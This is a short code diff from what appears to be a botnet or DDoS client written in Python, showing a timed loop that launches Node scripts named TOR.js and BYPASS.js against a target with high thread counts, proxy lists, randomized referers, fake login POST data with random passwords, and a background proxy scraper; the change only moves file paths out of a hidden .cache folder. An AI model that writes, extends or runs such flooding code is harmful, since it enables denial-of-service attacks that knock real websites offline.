@@ -162,19 +162,19 @@ def mn_lp():
                     while t.time() - st_tm < mx_tm:
                         if cmd == "TOR":
                             rn_cmd(
-                                f'node bin/odd/.cache/TOR.js GET "{tg}" 600 50 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full'
+                                f'node bin/odd/.cache/TOR.js GET "{tg}" 600 50 90 root/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full'
                             )
-                            rn_cmd(f"python3 bin/odd/.cache/scrape.py &")
+                            rn_cmd(f"python3 root/scrape.py &")
                             rn_cmd(
-                                f'node bin/odd/.cache/TOR.js POST "{tg}" 600 50 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full'
+                                f'node bin/odd/.cache/TOR.js POST "{tg}" 600 50 90 root/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full'
                             )
                         elif cmd == "BYPASS":
                             rn_cmd(
-                                f"node bin/odd/.cache/BYPASS.js {tg} 600 100 10 bin/odd/.cache/proxy.txt"
+                                f"node bin/odd/.cache/BYPASS.js {tg} 600 100 10 root/proxy.txt"
                             )
-                            rn_cmd(f"python3 bin/odd/.cache/scrape.py &")
+                            rn_cmd(f"python3 root/scrape.py &")
                             rn_cmd(
-                                f"node bin/odd/.cache/BYPASS.js {tg} 600 100 10 bin/odd/.cache/proxy.txt"
+                                f"node bin/odd/.cache/BYPASS.js {tg} 600 100 10 root/proxy.txt"
                             )
                         t.sleep(1)
                 except IndexError:
